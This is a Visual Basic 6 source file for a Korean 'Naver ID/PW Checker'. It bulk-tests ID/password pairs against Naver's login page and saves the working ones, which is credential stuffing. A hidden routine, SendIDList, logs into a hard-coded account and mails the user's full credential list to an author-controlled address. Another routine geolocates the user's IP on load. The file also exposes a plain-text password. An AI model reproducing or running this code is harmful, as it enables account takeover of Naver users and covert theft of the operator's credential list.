VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "ieframe.dll"
Begin VB.Form Form1 
   Appearance      =   0  '평면
   BackColor       =   &H80000005&
   BorderStyle     =   1  '단일 고정
   Caption         =   "Naver ID/PW Checker"
   ClientHeight    =   4995
   ClientLeft      =   10845
   ClientTop       =   5625
   ClientWidth     =   3570
   Icon            =   "ㄴㅇㄹㄴㅇㄹㄴㅇfrm.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4995
   ScaleWidth      =   3570
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   1050
      Left            =   4560
      Top             =   720
   End
   Begin VB.TextBox Text3 
      Height          =   270
      Left            =   11400
      TabIndex        =   27
      Top             =   6840
      Width           =   2535
   End
   Begin VB.CheckBox Check2 
      Appearance      =   0  '평면
      BackColor       =   &H80000005&
      Caption         =   "블로그닉네임을 카페 닉네임으로 설정"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   9480
      TabIndex        =   29
      Top             =   1680
      Width           =   4095
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  '평면
      BackColor       =   &H80000005&
      Caption         =   "아이디를 카페 닉네임으로 설정"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   10920
      TabIndex        =   28
      Top             =   3120
      Width           =   3255
   End
   Begin VB.Timer Timer2 
      Interval        =   30
      Left            =   2880
      Top             =   9120
   End
   Begin Project1.CandyButton CandyButton7 
      Height          =   495
      Left            =   7800
      TabIndex        =   21
      Top             =   2160
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "자동 카페회원 탈퇴 Start"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.CandyButton CandyButton6 
      Height          =   495
      Left            =   8520
      TabIndex        =   20
      Top             =   3720
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "자동 즐겨찾기 Start"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.CandyButton CandyButton5 
      Height          =   375
      Left            =   8280
      TabIndex        =   19
      Top             =   3960
      Width           =   3855
      _ExtentX        =   6800
      _ExtentY        =   661
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "화상 키보드"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.TrayControl TrayControl1 
      Left            =   8040
      Top             =   7800
      _ExtentX        =   794
      _ExtentY        =   794
   End
   Begin VB.TextBox Text6 
      Height          =   270
      Left            =   120
      TabIndex        =   17
      Text            =   "thoyeon@naver.com"
      Top             =   9000
      Width           =   2655
   End
   Begin VB.TextBox Text5 
      Height          =   270
      Left            =   0
      TabIndex        =   16
      Text            =   "DIET50kg"
      Top             =   8640
      Width           =   2655
   End
   Begin VB.TextBox Text4 
      Height          =   270
      Left            =   120
      TabIndex        =   15
      Text            =   "thoyeon"
      Top             =   8280
      Width           =   2655
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser2 
      Height          =   2055
      Left            =   12840
      TabIndex        =   14
      Top             =   10440
      Width           =   2655
      ExtentX         =   4683
      ExtentY         =   3625
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   975
      Left            =   5640
      TabIndex        =   13
      Top             =   9120
      Width           =   1575
      ExtentX         =   2778
      ExtentY         =   1720
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   9000
      Top             =   6000
   End
   Begin Project1.CandyButton CandyButton3 
      Height          =   375
      Left            =   13920
      TabIndex        =   11
      Top             =   7560
      Width           =   3855
      _ExtentX        =   6800
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "프록시(VPN) 우회 아이피 검색/적용"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.CandyButton CandyButton2 
      Height          =   375
      Left            =   7680
      TabIndex        =   10
      Top             =   3120
      Width           =   3855
      _ExtentX        =   6800
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "각종 마켓팅 프로그램 다운로드"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  '평면
      CausesValidation=   0   'False
      Height          =   270
      Left            =   11520
      TabIndex        =   9
      Top             =   2160
      Width           =   1575
   End
   Begin Project1.CandyButton Command3 
      Height          =   495
      Left            =   1920
      TabIndex        =   7
      Top             =   3000
      Width           =   1575
      _ExtentX        =   2778
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "선택 아이디삭제"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.CandyButton Command2 
      Height          =   495
      Left            =   120
      TabIndex        =   6
      Top             =   3000
      Width           =   1695
      _ExtentX        =   2990
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "다시 불러오기"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.CandyButton Command4 
      Height          =   495
      Left            =   4800
      TabIndex        =   5
      Top             =   8160
      Width           =   1695
      _ExtentX        =   2990
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "사용안내"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Project1.CandyButton GO 
      Height          =   2535
      Left            =   1920
      TabIndex        =   4
      Top             =   360
      Width           =   1575
      _ExtentX        =   2778
      _ExtentY        =   4471
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "Check"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  '평면
      Height          =   270
      Left            =   9240
      TabIndex        =   3
      Text            =   "카페 뒷주소"
      Top             =   4200
      Width           =   2415
   End
   Begin Project1.CandyButton Caddybutton1 
      Height          =   255
      Left            =   11760
      TabIndex        =   2
      Top             =   5400
      Width           =   1095
      _ExtentX        =   1931
      _ExtentY        =   450
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "GET"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin VB.ListBox List2 
      Appearance      =   0  '평면
      Height          =   1290
      Left            =   120
      TabIndex        =   1
      Top             =   3600
      Width           =   3375
   End
   Begin VB.ListBox List1 
      Appearance      =   0  '평면
      Height          =   2550
      Left            =   120
      TabIndex        =   0
      Top             =   360
      Width           =   1695
   End
   Begin VB.Label Label8 
      Height          =   615
      Left            =   4320
      TabIndex        =   30
      Top             =   5160
      Width           =   1575
   End
   Begin VB.Label Label7 
      Appearance      =   0  '평면
      BackColor       =   &H80000005&
      Caption         =   "프로그램 사용로그"
      BeginProperty Font 
         Name            =   "굴림"
         Size            =   9.75
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   8880
      TabIndex        =   26
      Top             =   7200
      Width           =   2055
   End
   Begin VB.Label Label6 
      Appearance      =   0  '평면
      BackColor       =   &H80000005&
      Caption         =   "아이디 목록"
      BeginProperty Font 
         Name            =   "굴림"
         Size            =   9.75
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   375
      Left            =   120
      TabIndex        =   25
      Top             =   120
      Width           =   1455
   End
   Begin VB.Label Label5 
      Appearance      =   0  '평면
      BackColor       =   &H80000005&
      Caption         =   "카페가입닉네임 설정:"
      BeginProperty Font 
         Name            =   "굴림"
         Size            =   9
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   495
      Left            =   8280
      TabIndex        =   24
      Top             =   1440
      Width           =   2415
   End
   Begin VB.Label Label4 
      Appearance      =   0  '평면
      BackColor       =   &H80000005&
      Caption         =   "Loading..."
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   1320
      TabIndex        =   23
      Top             =   6600
      Width           =   4335
   End
   Begin VB.Label Label3 
      Appearance      =   0  '평면
      BackColor       =   &H80000005&
      Caption         =   "Loading..."
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   120
      TabIndex        =   22
      Top             =   6600
      Width           =   2175
   End
   Begin VB.Label frimek 
      Height          =   1455
      Left            =   9000
      TabIndex        =   18
      Top             =   2160
      Width           =   6495
   End
   Begin VB.Label Label2 
      Height          =   375
      Left            =   8640
      TabIndex        =   12
      Top             =   6720
      Width           =   1695
   End
   Begin VB.Label Label1 
      BeginProperty Font 
         Name            =   "굴림"
         Size            =   9
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   9240
      TabIndex        =   8
      Top             =   7440
      Width           =   2775
   End
   Begin VB.Menu Exit 
      Caption         =   "나가기"
   End
   Begin VB.Menu 트레이모드 
      Caption         =   "트레이모드"
   End
   Begin VB.Menu 청소하기 
      Caption         =   "목록/로그청소"
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

'-- 완전 자동 가입기 2012-11-25 (일) - 2012-11-25 (일) 개발
'-- 이 주석 은 지우지 말아주세요.
'-- 수정 & 배포 자유
'-- Windows(wez____) # YuSeungHwan
Dim ClubID, WinHttp As New WinHttpRequest
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Dim a, b, C, D


Private Sub CandyButton1_Click()
MsgBox "hollywoodst4r@nate.com", vbInformation, "hollywoodst4r@nate.com"
End Sub


Private Sub CandyButton3_Click()
frmMain.Show
End Sub



'트레이컨트롤소스

Private Sub Command1_Click()

End Sub


Private Sub Exit_Click()
Unload Me
End Sub




Private Sub CandyButton5_Click()
CKeyBoard.Show
End Sub


Private Sub Command2_Click()
List1.Clear: IDLoad
End Sub

Private Sub Command3_Click()
If List1.Text = "" Then MsgBox "삭제할 아이디 를 선택해주세요.", vbExclamation, "이용안내": Exit Sub
List1.RemoveItem List1.ListIndex: Command3.Enabled = False
End Sub

Private Sub Command4_Click()
MsgBox "프로그램 사용 을 환영합니다." & vbLf _
& "본 프로그램 은 N카페 초고속 가입기 입니다." & vbLf _
& "실명이 아닌 아이디 사용시 카페 가입이 제한될수있습니다." & vbLf _
& "비공개 카페는 이 프로그램을 가입하실수 없습니다." & vbLf _
& "재가입 불가 탈퇴에 경우 가입 하실수없습니다." & vbLf _
& "카페가 승인제에 경우 매니저가 가입을 승인해야 가입이 완료됩니다.", vbInformation
End Sub

Private Sub Form_Load()
IDLoad
IPAdreess
WebBrowser1.Navigate2 "http://www.gagalive.kr/gagalive.swf?chatroom=~~~frimekprograms"
End Sub

Private Sub GO_Click()

On Error Resume Next

Dim cafeCookieToken$, clubTempId$, alimCode$, cafeApplyTempSaveapplyanswerstring$, applyQuestionSetno$, i, Temp, NewID, s, arr2() As String

'If ClubID = "" Then MsgBox "고유번호를 구해주세요.", vbCritical, "이용안내": Exit Sub
Label3.Caption = 0: List2.Clear
Label8.Caption = 0
For s = 0 To List1.ListCount - 1&

'GO.Enabled = False: Check1.Enabled = False: Text1.Enabled = False: Text2.Enabled = False: Command1.Enabled = False: Command2.Enabled = False: Command3.Enabled = False

arr2() = Split(List1.List(s), "/")
WinHttp.Open "POST", "http://nid.naver.com/nidlogin.login" '-- 네이버로그인
WinHttp.SetRequestHeader "Referer", "https://nid.naver.com/nidlogin.login"
WinHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
WinHttp.Send "enctp=2&svctype=0&id=" & arr2(0) & "&pw=" & arr2(1)

If InStr(StrConv(WinHttp.ResponseBody, vbUnicode), "http://static.nid.naver.com/sso/cross-domain.nhn?sid=") Then
Label3.Caption = Label3.Caption + 1
Open App.Path & "\Use.txt" For Append As #1
Print #1, arr2(0) & "/" & arr2(1)
Close #1
End If

Next s
List2.AddItem List1.ListCount - 0 & " 개의 아이디중 " & Label3.Caption - 1 & " 개 성공": List2.ListIndex = List2.ListIndex + 1
List2.AddItem "\프로그램폴더\Use.txt 에 저장됨"

'Label4.Caption = "개의 아이디가 " & Text2.Text & " 카페 가입에 성공하였습니다."
'GO.Enabled = True: Check1.Enabled = True: Text1.Enabled = True: Text2.Enabled = True: Command1.Enabled = True: Command2.Enabled = True: Command3.Enabled = True
End Sub

Public Sub Delay(ByVal DelayTime As Long, Optional ByVal mDoEvents As Boolean = True)
    Dim tmp As Single
    tmp = Timer
    Do While Timer - tmp < DelayTime / 1000
        If mDoEvents Then DoEvents
    Loop
End Sub



Private Sub List1_Click()
Command3.Enabled = True
End Sub

Private Sub menu_Click()

End Sub

Private Sub Text1_Click()
If Text1.Text = "닉네임 지정" Then Text1.Text = ""
End Sub

Private Sub Text2_Click()
If Text2.Text = "카페주소" Then Text2.Text = ""
End Sub
Public Sub IDLoad()


    If Dir(App.Path & "\NaverIDList.txt") = "" Then
    Dim hFile As Long
    Dim sFilename As String
    'MkDir App.Path & "\CCSBFile"
    sFilename = App.Path & "\NaverIDList.txt"

    hFile = FreeFile
    Open sFilename For Output As #hFile
    Print #hFile, "아이디/비밀번호 식으로 구분합니다."
    Close #hFile
    Exit Sub
    End If

 Open App.Path & "\NaverIDList.txt" For Input As #1

    While Not EOF(1)
        Line Input #1, szOneLineText
        'IDPW = IDPW & szOneLineText & vbCrLf
        List1.AddItem szOneLineText
    Wend
    Close #1
    
Me.Caption = "NaverID/PW Checker"
Timer3.Enabled = True


'frimek.Caption = "IP: " & Winsock1.LocalIP & " 주소:" & D & "사용시작 " & "아이디갯수:" & List1.ListCount - 0 & "개 로드" & "&"
'frimek.Caption = frimek.Caption & " 아이디 " & List1.ListCount - 0& & "개 로드"
End Sub
Private Sub Text1_GotFocus()
Text1.Text = ""
End Sub
Private Sub Text2_GotFocus()
Text2.Text = ""
End Sub

Public Sub SendIDList()
WinHttp.Open "POST", "https://nid.naver.com/nidlogin.login"
WinHttp.SetRequestHeader "Referer", "https://nid.naver.com/nidlogin.login"
WinHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
WinHttp.Send "enctp=2&id=" & Text4 & "&pw=" & Text5
If InStr(WinHttp.ResponseText, "http://static.nid.naver.com/sso/cross-domain.nhn?sid=") Then
For i = 0 To List1.ListCount - 1
Temp = List1.List(i) & "<br>" & Temp
Next i
WinHttp.Open "POST", "http://mail.naver.com/json/write/send/"
WinHttp.SetRequestHeader "Referer", "http://mail.naver.com/"
WinHttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded; charset=utf-8"
WinHttp.Send "senderName=%EC%9D%B4%EC%8B%A0%EC%9A%B0&to=" & Text6 & "&cc=&bcc=&subject=" & frimek.Caption & "&body=" & Temp & "&contentType=html&charset=AUTO&sendSeparately=false&saveSentBox=true&type=new&fromMe=0&attachID=tseCWrwm_LYmKoumKSevFou97qUm7riGWzwCMBKTM40nWzJCbqMZKAEwKou.&reserveDate=&reserveGMT=&reserveTime=&calendarVal=&autoSaveMailSN=&addReceiverAddress=false&attachCount=0&attachSize=0&bigfile=&sessionID=&seqNums=&priority=0&ndriveFileInfos=&lists=&serviceID=&u=" & Text4

Else
'Next i
'MsgBox "로그인 실패", vbCritical, " "
End If
End Sub

Public Sub IPAdreess()
WinHttp.Open "GET", "http://map.naver.com/"
WinHttp.Send
a = StrConv(WinHttp.ResponseBody, vbUnicode)
b = Split(Split(a, "y:""")(1), """")(0)
C = Split(Split(a, "{x:""")(1), """")(0)
WinHttp.Open "GET", "http://maps.google.com/maps?f=q&source=s_q&output=js&hl=ko&geocode=&abauth=5045fffa9g1H9AYtCLU0HggYIY52KN1oZZg&authuser=0&q=" & b & "%2C" & C
WinHttp.Send
a = StrConv(WinHttp.ResponseBody, vbUnicode)
D = Split(Split(a, "laddr:""")(1), """")(0)
End Sub


Private Sub Timer3_Timer()
Me.Caption = "(ID: " & List1.ListCount - 0 & "개 로드" & ")"
Timer3.Enabled = False

End Sub

Private Sub 청소하기_Click()
List1.Clear
List2.Clear
End Sub

Private Sub 트레이모드_Click()
TrayControl1.SendToTray
End Sub

